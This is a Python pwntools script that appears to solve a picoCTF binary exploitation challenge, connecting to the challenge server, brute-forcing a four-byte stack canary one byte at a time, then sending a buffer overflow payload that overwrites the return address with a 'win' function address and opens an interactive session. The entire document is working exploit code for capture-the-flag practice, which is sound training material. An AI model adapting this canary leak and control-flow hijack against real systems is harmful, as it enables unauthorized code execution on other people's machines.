from pwn import *
#context.log_level = "DEBUG"
def leak_canary(payload ,guess):
    # p = process("./vuln")
    p = remote("saturn.picoctf.net", 62714)
    p.recvuntil(b"> ")
    p.sendline(b"150")
    payload = payload + bytes([guess])
    p.recvuntil(b"Input> ")
    p.send(payload)
    res = p.recvuntil(b"\n")
    p.close()
    if b"Ok..." in res:
        print("find", hex(guess))
        return 1
    return 0

win = 0x08049336
offset = 84
offset_canary = 64
canary = b""
payload = offset_canary * b"P"
# find canary
for b in range(4):
    for i in range(256):
        if(leak_canary(payload, i)):
            payload += bytes([i])
            canary += bytes([i])
            break
print("canary: ", canary)

#start exploit
#p = process("./vuln")
p = remote("saturn.picoctf.net", 62714)
p.recvuntil(b"> ")
p.sendline(b"150")
#gdb.attach(p, gdbscript = "b *0x08049551\nb *0x08049564")
p.recvuntil(b"Input> ")
payload = flat({offset_canary: canary, offset: win})
p.sendline(payload)
p.interactive()
